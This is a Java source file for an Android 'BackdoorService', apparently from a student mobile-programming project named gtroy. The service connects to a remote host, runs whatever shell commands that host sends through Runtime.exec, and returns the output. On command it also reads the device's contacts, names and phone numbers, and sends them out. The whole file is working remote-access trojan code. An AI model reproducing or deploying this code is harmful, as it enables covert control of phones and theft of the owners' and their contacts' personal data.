package id.ac.ui.cs.mobileprogramming.gregoriusaprisunnea.gtroy.services;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.Nullable;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.ArrayList;

public class BackdoorService extends Service {
    private static BackdoorService instance;
    boolean isConnected = false;
    Socket socket;

    private Uri uri = ContactsContract.Contacts.CONTENT_URI;

    public static final String TYPE = "type";
    public static final String TYPE_COMMAND = "command";
    public static final String TYPE_CONNECTION = "connection";
    public static final String CONNECTION_CONNECTED = "true";
    public static final String CONNECTION_DISCONNECTED = "false";
    public static final String BROADCAST_VALUE = "value";

    private final String EXECUTE_COMMAND_TEMPLATE = "execute";
    private final String GET_CONTACT_TEMPLATE = "get_contact";

    public static final String BACKDOOR_BR = "id.ac.ui.cs.mobileprogramming.gregoriusaprisunnea.gtroy.services.backdoorservice";
    Intent bi = new Intent(BACKDOOR_BR);


    private HandlerThread connectionHandlerThread = new HandlerThread("connectionHandler");
    private Handler connectionHandler;

    private Runnable connectionRunnable;

    public static BackdoorService getInstance() {
        if(instance == null) {
            instance = new BackdoorService();
        }
        return instance;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            connectionHandlerThread.start();
            connectionHandler = new Handler(connectionHandlerThread.getLooper());
        } catch(Exception e) {
            disconnect();
        }
    }

    @Override
    public void onDestroy() {
        disconnect();
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String ip = intent.getStringExtra("ip");
        int port = Integer.valueOf(intent.getStringExtra("port"));
        connectionRunnable = getConnectionRunnable(ip, port);
        connectionHandler.removeCallbacks(connectionRunnable);
        connectionHandler.postDelayed(connectionRunnable, 0);
        return super.onStartCommand(intent, flags, startId);
    }

    private void disconnect() {
        try{
            if (isConnected) {
                socket.close();
            }
        } catch (Exception e) {
            Log.i("ERROR", "Can't close socket connection");
        }

        isConnected = false;
        bi.putExtra(TYPE, TYPE_CONNECTION);
        bi.putExtra(BROADCAST_VALUE, CONNECTION_DISCONNECTED);
        sendBroadcast(bi);
        bi.removeExtra(TYPE);
        bi.removeExtra(BROADCAST_VALUE);

        connectionHandler.removeCallbacks(connectionRunnable);
    }

    private Runnable getConnectionRunnable(final String ip, final int port) {
        return new Runnable() {
            @Override
            public void run() {
                PrintWriter output;
                BufferedReader input;
                try {
                    socket = new Socket(ip, port);
                    socket.setKeepAlive(true);

                    bi.putExtra(TYPE, TYPE_CONNECTION);
                    bi.putExtra(BROADCAST_VALUE, CONNECTION_CONNECTED);
                    sendBroadcast(bi);
                    bi.removeExtra(TYPE);
                    bi.removeExtra(BROADCAST_VALUE);
                    isConnected = true;

                    output = new PrintWriter(socket.getOutputStream());
                    input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    while (isConnected) {
                        String receivedInput = input.readLine();

                        if (receivedInput == null || !isConnected) {
                            output.flush();
                            disconnect();
                            break;
                        } else {
                            bi.putExtra(TYPE, TYPE_COMMAND);
                            bi.putExtra(BROADCAST_VALUE, receivedInput);
                            sendBroadcast(bi);
                            bi.removeExtra(TYPE);
                            bi.removeExtra(BROADCAST_VALUE);

                            String result = evalOutput(receivedInput);
                            output.write(result);
                            output.flush();
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

        };
    }

    private String evalOutput(String input) {
        String result = "Error, can't understand input\n";
        try {
            String[] cmd = input.split(" ");
            if (cmd[0].equals(EXECUTE_COMMAND_TEMPLATE)) {

                input = input.replaceFirst(EXECUTE_COMMAND_TEMPLATE + " ", "");
                result = execute(input);
            } else if(cmd[0].equals(GET_CONTACT_TEMPLATE)) {
                //TODO: ContactProvider
                String local_result = "";
                try {
                    ArrayList<Contact> contacts = getContacts();
                    for(Contact c : contacts) {
                        local_result += c.name + "\n" + c.telp + "\n";
                    }
                    result = local_result;
                } catch (Exception e) {
                    e.printStackTrace();
                    Log.i("ggg-Error", "[EvalOutput CONTACT] Error contact Provider");
                }
                result = local_result;
            }
        } catch (Exception e) {
            Log.i("ERROR", "Can't parse commandInput: " + input);
        }
        return result;
    }

    private String execute(String commandInput) {
        String result = "Error Occurred\n";
        Log.i("ggg-execute", "commandInput: " + commandInput);
        try{
            Process process = Runtime.getRuntime().exec(commandInput);
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));

            int read;
            char[] buffer = new char[4096];
            StringBuffer output = new StringBuffer();
            while ((read = reader.read(buffer)) > 0) {
                output.append(buffer, 0, read);
            }
            process.waitFor();
            result = output.toString();
        }catch(IOException e){
            Log.d("ggg-exception throwed", e.getMessage());
            e.printStackTrace();
        }catch(InterruptedException e){
            Log.d("ggg-exception throwed", e.getMessage());
            e.printStackTrace();
        }
        return result;
    }

    // source: https://www.androhub.com/android-read-contacts-using-content-provider/
    private ArrayList<Contact> getContacts() {
        Cursor contactsCursor = getContentResolver().query(uri, null, null,
                null, ContactsContract.Contacts.DISPLAY_NAME + " ASC ");
        ArrayList<Contact> contacts = new ArrayList<>();


        if (contactsCursor.moveToFirst()) {
            do {
                long contactId = contactsCursor.getLong(contactsCursor
                        .getColumnIndex("_ID"));

                Uri dataUri = ContactsContract.Data.CONTENT_URI;
                Cursor dataCursor = getContentResolver().query(dataUri, null,
                        ContactsContract.Data.CONTACT_ID + " = " + contactId,
                        null, null);

                String displayName = "";
                String phoneNumber = "";
                if (dataCursor.moveToFirst()) {
                    displayName = dataCursor
                            .getString(dataCursor
                                    .getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    do {
                        if (dataCursor
                                .getString(
                                        dataCursor.getColumnIndex("mimetype"))
                                .equals(ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)) {

                            switch (dataCursor.getInt(dataCursor
                                    .getColumnIndex("data2"))) {
                                case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                                    phoneNumber += "Home Phone : " + dataCursor.getString(dataCursor
                                            .getColumnIndex("data1")) + "\n";
                                    break;

                                case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                                    String workPhone = dataCursor.getString(dataCursor
                                            .getColumnIndex("data1"));
                                    phoneNumber += "Work Phone : " + workPhone
                                            + "\n";
                                    break;

                                case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                                    String mobilePhone = dataCursor.getString(dataCursor
                                            .getColumnIndex("data1"));
                                    phoneNumber += "Mobile Phone : "
                                            + mobilePhone + "\n";
                                    break;
                            }
                        }
                    } while(dataCursor.moveToNext());
                }
                Contact c = new Contact(displayName, phoneNumber);
                contacts.add(c);

            } while(contactsCursor.moveToNext());
        }
        return contacts;
    }

    class Contact {
        public String name;
        public String telp;
        public Contact(String name, String telp) {
            this.name = name;
            this.telp = telp;
        }
    }
}
